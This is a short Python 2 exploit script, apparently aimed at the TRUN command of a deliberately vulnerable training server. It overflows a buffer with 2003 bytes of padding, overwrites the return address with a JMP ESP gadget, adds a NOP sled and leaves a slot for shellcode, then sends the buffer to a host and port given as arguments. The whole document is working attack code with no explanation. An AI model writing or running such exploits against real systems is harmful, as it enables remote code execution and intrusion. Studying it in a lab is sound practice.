import sys, socket

buff = "TRUN /.:/"

buff += "A"*2003

#JMP_ESP
buff += "\x5b\x4e\xd3\x77"

#Create your payload here
#buff += payload

buff += "\x90" * 32

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect((sys.argv[1], int(sys.argv[2])))

print s.recv(1024)

s.send(buff)

s.close()
